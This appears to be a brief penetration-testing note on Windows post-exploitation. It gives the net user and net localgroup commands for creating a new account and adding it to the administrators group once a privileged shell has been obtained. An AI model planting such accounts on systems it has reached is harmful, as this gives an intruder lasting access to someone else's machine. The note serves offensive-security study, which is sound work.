
tags: #type/theory #tech/OS/windows #tech/shell 

---
# Add user
if you have a shell with high privileges (SYSTEM user or administrator), you can simply add a new user in the administrator group and connect to it using any method 

create user in powershell:
`net user <username> <password> /add`
add user to admin group:
`net localgroup administrators <username> /add`